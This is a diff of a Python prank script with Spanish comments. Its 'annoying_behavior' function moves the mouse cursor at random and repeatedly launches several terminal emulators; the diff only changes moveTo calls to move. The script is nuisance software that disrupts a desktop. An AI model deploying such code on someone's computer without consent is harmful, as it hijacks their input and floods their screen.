@@ -2,7 +2,7 @@ from sys import exc_info
 from os import path, system
 from random import choice, randint
 from webbrowser import open
-from pyautogui import moveTo
+from pyautogui import move
 from time import sleep
 # Por si hay algún error
 def handle(e):
@@ -47,34 +47,34 @@ def annoying_behavior():
 #         posición aleatoria comprendida entre
 #         1 y 256
           sleep(2)
-          moveTo(x=randint(1, 256),
-                 y=randint(1, 256))
+          move(xOffset=randint(1, 256),
+                 yOffset=randint(1, 256))
          
 #         Intenta abrir diferentes emuladores
 #         de terminal
           system('qterminal')
-          moveTo(x=randint(1, 256),
-               y=randint(1, 256))
+          move(xOffset=randint(1, 256),
+               yOffset=randint(1, 256))
           
           system('terminator')
-          moveTo(x=randint(1, 256),
-               y=randint(1, 256))
+          move(xOffset=randint(1, 256),
+               yOffset=randint(1, 256))
           
           system('alacritty')
-          moveTo(x=randint(1, 256),
-               y=randint(1, 256))
+          move(xOffset=randint(1, 256),
+               yOffset=randint(1, 256))
           
           system('xterm')
-          moveTo(x=randint(1, 256),
-               y=randint(1, 256))
+          move(xOffset=randint(1, 256),
+               yOffset=randint(1, 256))
           
           system('konsole')
-          moveTo(x=randint(1, 256),
-               y=randint(1, 256))
+          move(xOffset=randint(1, 256),
+               yOffset=randint(1, 256))
           
           system('xfce4-terminal-emulator')
-          moveTo(x=randint(1, 256),
-               y=randint(1, 256))
+          move(xOffset=randint(1, 256),
+               yOffset=randint(1, 256))
           
      except KeyboardInterrupt:
           print("XD")
